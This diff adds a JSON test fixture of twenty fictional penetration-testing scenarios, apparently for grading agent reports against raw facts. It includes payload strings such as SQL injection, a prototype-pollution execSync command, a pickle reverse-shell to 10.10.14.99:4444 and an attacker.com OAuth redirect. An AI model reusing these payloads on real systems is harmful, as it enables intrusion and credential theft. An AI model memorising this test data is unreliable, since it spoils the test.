@@ -1,0 +1,248 @@
+[
+  {
+    "id": "scenario_01_pwn_offsets",
+    "name": "Binary Exploitation - Offsets & Leaks",
+    "raw_facts": {
+      "target_binary": "/opt/vuln_server",
+      "overflow_offset": 72,
+      "canary": "0x4a1f8c00",
+      "libc_base": "0x7f8a9b1c2000",
+      "system_addr": "0x7f8a9b213450",
+      "bin_sh_addr": "0x7f8a9b345678",
+      "rop_gadget": "0x401234 (pop rdi; ret)"
+    },
+    "leaf_report": "PWN TRIAGE COMPLETED: Target /opt/vuln_server has stack buffer overflow at offset 72. Leaked canary=0x4a1f8c00, libc_base=0x7f8a9b1c2000, system=0x7f8a9b213450, /bin/sh=0x7f8a9b345678, gadget 'pop rdi; ret'=0x401234. Exploit ready for ROP chain."
+  },
+  {
+    "id": "scenario_02_web_sqli",
+    "name": "Web Application - SQL Injection & Credentials",
+    "raw_facts": {
+      "endpoint": "POST /api/v1/auth/login",
+      "vulnerable_param": "username",
+      "payload": "' UNION SELECT 1,username,password_hash,4 FROM users WHERE id=1-- -",
+      "extracted_user": "admin_sec",
+      "password_hash": "$2a$12$e8xYz9AbCdEfGhIjKlMnOpQrStUvWxYz0123456789ABCDEFGH",
+      "cracked_password": "SuperSecret2026!"
+    },
+    "leaf_report": "SQLi CONFIRMED on POST /api/v1/auth/login via param 'username'. Injected: ' UNION SELECT 1,username,password_hash,4 FROM users WHERE id=1-- - . Dumped admin_sec with hash $2a$12$e8xYz9AbCdEfGhIjKlMnOpQrStUvWxYz0123456789ABCDEFGH cracked to 'SuperSecret2026!'."
+  },
+  {
+    "id": "scenario_03_ad_adcs",
+    "name": "Active Directory - ADCS ESC1 Certificate Forgery",
+    "raw_facts": {
+      "domain": "CORP.LOCAL",
+      "ca_name": "CORP-CA-01",
+      "template": "ESC1-UserEnrollment",
+      "forged_san": "administrator@corp.local",
+      "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+      "ticket_type": "TGT"
+    },
+    "leaf_report": "ADCS ESC1 EXPLOITED on CORP.LOCAL: CA CORP-CA-01 template 'ESC1-UserEnrollment' allows arbitrary SAN. Requested cert for administrator@corp.local. Retrieved TGT with PKINIT, extracted NTLM hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0."
+  },
+  {
+    "id": "scenario_04_web_jwt",
+    "name": "Web Application - JWT Key Confusion",
+    "raw_facts": {
+      "endpoint": "/auth/verify",
+      "alg": "HS256",
+      "original_alg": "RS256",
+      "jwt_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiZXhwIjoxNzg5MDAwMDAwfQ.5k8Xz9...",
+      "hmac_key_fingerprint": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQE..."
+    },
+    "leaf_report": "JWT KEY CONFUSION SUCCESS on /auth/verify: Backend accepts HS256 signed with public RSA key MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQE... Forged admin token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiZXhwIjoxNzg5MDAwMDAwfQ.5k8Xz9... gives superadmin role."
+  },
+  {
+    "id": "scenario_05_proto_pollution",
+    "name": "Client/Server Prototype Pollution RCE",
+    "raw_facts": {
+      "endpoint": "POST /api/v2/settings/update",
+      "polluted_property": "__proto__.outputFunctionName",
+      "payload": "x;process.mainModule.require('child_process').execSync('cat /flag > /tmp/out');s",
+      "trigger_url": "GET /render/dashboard",
+      "flag_location": "/tmp/out"
+    },
+    "leaf_report": "PROTOTYPE POLLUTION RCE on POST /api/v2/settings/update: Polluted __proto__.outputFunctionName with 'x;process.mainModule.require('child_process').execSync('cat /flag > /tmp/out');s'. Triggered via GET /render/dashboard, flag written to /tmp/out."
+  },
+  {
+    "id": "scenario_06_linux_privesc",
+    "name": "Linux Privilege Escalation - SUID & Capabilities",
+    "raw_facts": {
+      "suid_binary": "/usr/local/bin/sys_diag",
+      "vulnerable_cap": "cap_setuid+ep",
+      "exploit_env": "LD_PRELOAD=/tmp/evil_hook.so",
+      "root_shadow_hash": "$6$rounds=5000$saltstring$9x1y8z...",
+      "root_flag": "FLAG{suid_c4p_3sc4l4t10n_w0n}"
+    },
+    "leaf_report": "LINUX PRIVESC COMPLETED: Binary /usr/local/bin/sys_diag has cap_setuid+ep and honors LD_PRELOAD=/tmp/evil_hook.so. Spawned root shell, extracted shadow $6$rounds=5000$saltstring$9x1y8z... and flag FLAG{suid_c4p_3sc4l4t10n_w0n}."
+  },
+  {
+    "id": "scenario_07_lattice_crypto",
+    "name": "Cryptography - ECDSA Nonce Bias LLL",
+    "raw_facts": {
+      "curve": "secp256k1",
+      "nonce_leak_bits": "MSB 3 bits = 0b101",
+      "sig_r1": "0x7890123456789012345678901234567890123456789012345678901234567890",
+      "sig_s1": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
+      "recovered_privkey": "0xdeadbeefc001cafe1337c0de88889999aaaabbbbccccddddeeeeffff00001111"
+    },
+    "leaf_report": "ECDSA NONCE BIAS RECOVERED: Curve secp256k1 with 3-bit MSB bias (0b101). Solved via LLL lattice reduction with r1=0x7890123456789012345678901234567890123456789012345678901234567890, s1=0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef. Private key=0xdeadbeefc001cafe1337c0de88889999aaaabbbbccccddddeeeeffff00001111."
+  },
+  {
+    "id": "scenario_08_http_smuggling",
+    "name": "HTTP Request Smuggling - H2.CL",
+    "raw_facts": {
+      "target_host": "gateway.internal.corp",
+      "frontend_proto": "HTTP/2",
+      "backend_proto": "HTTP/1.1",
+      "smuggled_method": "POST /admin/secrets/export",
+      "smuggled_header": "X-Internal-Token: secret_token_999888777",
+      "admin_session_cookie": "ADMIN_SESSION=sess_fa98b712c3"
+    },
+    "leaf_report": "HTTP/2 SMUGGLING (H2.CL) VERIFIED on gateway.internal.corp: Injected smuggled POST /admin/secrets/export with header X-Internal-Token: secret_token_999888777. Captured next user request yielding ADMIN_SESSION=sess_fa98b712c3."
+  },
+  {
+    "id": "scenario_09_k8s_escape",
+    "name": "Kubernetes Pod Escape & Token Abuse",
+    "raw_facts": {
+      "sa_token_path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+      "api_server": "https://10.96.0.1:443",
+      "service_account": "system:serviceaccount:default:deployer",
+      "host_mount_path": "/host/etc/kubernetes/admin.conf",
+      "cluster_admin_cert": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t..."
+    },
+    "leaf_report": "K8S CONTAINER ESCAPE: Stole token from /var/run/secrets/kubernetes.io/serviceaccount/token for system:serviceaccount:default:deployer. Created privileged pod mounting host root; exfiltrated /host/etc/kubernetes/admin.conf cert LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t... against API https://10.96.0.1:443."
+  },
+  {
+    "id": "scenario_10_ctf_flag",
+    "name": "CTF Target Output & Flag Verification",
+    "raw_facts": {
+      "target_ip": "10.10.10.123",
+      "target_port": 9001,
+      "flag": "CTF{m1n1m4l_4g3nt_h13r4rchy_pr3c1s10n_99}",
+      "flag_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "service_banner": "SecureVault v4.2 Authenticated"
+    },
+    "leaf_report": "FLAG CAPTURED from 10.10.10.123:9001 (SecureVault v4.2 Authenticated): Real output matched flag format -> CTF{m1n1m4l_4g3nt_h13r4rchy_pr3c1s10n_99} with sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855."
+  },
+  {
+    "id": "scenario_11_web3_reentrancy",
+    "name": "Web3 Smart Contract - Flash Loan & Reentrancy",
+    "raw_facts": {
+      "contract_address": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D",
+      "vulnerable_function": "withdrawAll(uint256)",
+      "stolen_amount_eth": "1450.5 ETH",
+      "exploit_tx_hash": "0x9f1a8b7c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcd",
+      "callback_hook": "uniswapV2Call(address,uint256,uint256,bytes)"
+    },
+    "leaf_report": "WEB3 EXPLOIT SUCCESS: Target contract 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D vulnerable to cross-function reentrancy on withdrawAll(uint256). Triggered via uniswapV2Call(address,uint256,uint256,bytes) flash loan, draining 1450.5 ETH in tx 0x9f1a8b7c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcd."
+  },
+  {
+    "id": "scenario_12_ai_prompt_injection",
+    "name": "AI/LLM Security - Tool Hijacking & Pickle RCE",
+    "raw_facts": {
+      "model_repo": "hf.co/corp-ai/finance-gpt",
+      "poisoned_file": "pytorch_model.bin",
+      "model_weights_sha256": "4a7d1ed414474e4033ac29ccb8653d9b",
+      "reverse_shell_ip": "10.10.14.99",
+      "reverse_shell_port": 4444,
+      "pickle_payload": "cos\\nsystem\\n(S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.99 4444 >/tmp/f'\\ntR."
+    },
+    "leaf_report": "AI MODEL POISONING EXPLOITED: Downloaded hf.co/corp-ai/finance-gpt pytorch_model.bin with sha256 4a7d1ed414474e4033ac29ccb8653d9b. Deserialization triggered pickle payload cos\\nsystem\\n(S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.99 4444 >/tmp/f'\\ntR. connecting to 10.10.14.99:4444."
+  },
+  {
+    "id": "scenario_13_win_kernel_pwn",
+    "name": "Windows Kernel Pwn - Token Stealing Shellcode",
+    "raw_facts": {
+      "driver_device": "\\\\.\\VulnKernelDrv",
+      "ioctl_code": "0x222003",
+      "system_eprocess": "0xfffffa800365b060",
+      "target_token_offset": "0x4b8",
+      "stolen_system_token": "0xfffffa800365b060+0x4b8"
+    },
+    "leaf_report": "WINDOWS KERNEL EXPLOITATION SUCCESS: Sent IOCTL 0x222003 to \\\\.\\VulnKernelDrv. Leaked SYSTEM EPROCESS 0xfffffa800365b060 and token offset 0x4b8. Stole system token 0xfffffa800365b060+0x4b8, escalated process to NT AUTHORITY\\SYSTEM."
+  },
+  {
+    "id": "scenario_14_graphql_batching",
+    "name": "GraphQL - Schema Introspection & Batch Brute",
+    "raw_facts": {
+      "graphql_endpoint": "/api/graphql/v1",
+      "private_mutation": "executeInternalAdminCmd(secretKey: $key, cmd: $cmd)",
+      "extracted_api_key": "sec_key_live_9988aabbccddeeff00112233",
+      "batch_query_count": 500,
+      "mfa_bypass_token": "MFA_OVERRIDE_TOKEN_774411"
+    },
+    "leaf_report": "GRAPHQL INJECTION CONFIRMED: Introspected endpoint /api/graphql/v1 discovering private mutation executeInternalAdminCmd(secretKey: $key, cmd: $cmd). Executed 500 batch queries, dumped api_key sec_key_live_9988aabbccddeeff00112233 and token MFA_OVERRIDE_TOKEN_774411."
+  },
+  {
+    "id": "scenario_15_oauth_state_bypass",
+    "name": "OAuth2 / OIDC - State Parameter Bypass & Code Theft",
+    "raw_facts": {
+      "auth_server": "https://sso.enterprise.corp/oauth/authorize",
+      "client_id": "client_998877665544",
+      "redirect_uri": "https://attacker.com/oauth/callback",
+      "stolen_auth_code": "spl_code_884422aabbccddee11",
+      "access_token": "ya29.a0AfH6SMD_998877665544332211..."
+    },
+    "leaf_report": "OAUTH2 STATE BYPASS SUCCESS: Intercepted https://sso.enterprise.corp/oauth/authorize for client_id client_998877665544 with redirected callback https://attacker.com/oauth/callback. Captured auth code spl_code_884422aabbccddee11, exchanged for access token ya29.a0AfH6SMD_998877665544332211..."
+  },
+  {
+    "id": "scenario_16_saml_xsw",
+    "name": "SAML 2.0 - XML Signature Wrapping (XSW3)",
+    "raw_facts": {
+      "idp_entity_id": "https://idp.corp.internal/saml/metadata",
+      "assertion_id": "_9f1a2b3c4d5e6f708192a3b4c5d6e7f8",
+      "forged_name_id": "superadmin@corp.internal",
+      "signing_cert_serial": "0x12A4B8C900",
+      "relay_state": "https://app.corp.internal/dashboard/admin"
+    },
+    "leaf_report": "SAML XSW3 ATTACK VERIFIED: Cloned signed assertion _9f1a2b3c4d5e6f708192a3b4c5d6e7f8 from https://idp.corp.internal/saml/metadata (cert serial 0x12A4B8C900). Forged NameID to superadmin@corp.internal, forwarded RelayState to https://app.corp.internal/dashboard/admin gaining full admin access."
+  },
+  {
+    "id": "scenario_17_firmware_uart",
+    "name": "Embedded & IoT - UART Root Shell & Bootargs",
+    "raw_facts": {
+      "baud_rate": 115200,
+      "uboot_env_command": "setenv bootargs console=ttyS0,115200 root=/dev/mtdblock3 init=/bin/sh",
+      "mtd_partition": "/dev/mtdblock3",
+      "extracted_firmware_key": "AES_FIRMWARE_KEY=99aaccbb887766554433221100ffeedd",
+      "device_model": "RouterAX3000-v2"
+    },
+    "leaf_report": "FIRMWARE UART ROOT ACHIEVED: Connected at baud 115200 on RouterAX3000-v2. Interrupted U-Boot and executed 'setenv bootargs console=ttyS0,115200 root=/dev/mtdblock3 init=/bin/sh'. Dumped /dev/mtdblock3 extracting AES_FIRMWARE_KEY=99aaccbb887766554433221100ffeedd."
+  },
+  {
+    "id": "scenario_18_redis_rogue_master",
+    "name": "Redis Unauthenticated RCE - Rogue Master Replication",
+    "raw_facts": {
+      "redis_host": "10.10.10.55",
+      "redis_port": 6379,
+      "rogue_module_file": "/tmp/exp.so",
+      "injected_command": "system.exec 'id; whoami'",
+      "command_output": "uid=0(root) gid=0(root) groups=0(root)"
+    },
+    "leaf_report": "REDIS ROGUE MASTER RCE on 10.10.10.55:6379: Spawned rogue master, replicated malicious module /tmp/exp.so. Executed system.exec 'id; whoami' yielding output 'uid=0(root) gid=0(root) groups=0(root)'."
+  },
+  {
+    "id": "scenario_19_bluetooth_ble",
+    "name": "Wireless & IoT - BLE GATT Characteristic Manipulation",
+    "raw_facts": {
+      "ble_mac_address": "AA:BB:CC:11:22:33",
+      "service_uuid": "0000ffe0-0000-1000-8000-00805f9b34fb",
+      "char_uuid": "0000ffe1-0000-1000-8000-00805f9b34fb",
+      "unlock_payload_hex": "0x55AA0101FE00",
+      "master_pairing_pin": "884129"
+    },
+    "leaf_report": "BLE GATT ATTACK SUCCESS: Connected to AA:BB:CC:11:22:33 using pairing PIN 884129. Under service 0000ffe0-0000-1000-8000-00805f9b34fb, wrote unlock payload 0x55AA0101FE00 to characteristic 0000ffe1-0000-1000-8000-00805f9b34fb."
+  },
+  {
+    "id": "scenario_20_android_frida",
+    "name": "Mobile Security - Frida Hooking & AES Key Decryption",
+    "raw_facts": {
+      "package_name": "com.securecorp.banking",
+      "hooked_class": "javax.crypto.Cipher",
+      "hooked_method": "doFinal(byte[])",
+      "aes_key_hex": "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d",
+      "decrypted_vault_pin": "PIN_998877"
+    },
+    "leaf_report": "ANDROID FRIDA HOOK COMPLETED: Injected into com.securecorp.banking hooking javax.crypto.Cipher.doFinal(byte[]). Intercepted AES key 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d and decrypted user PIN_998877."
+  }
+]
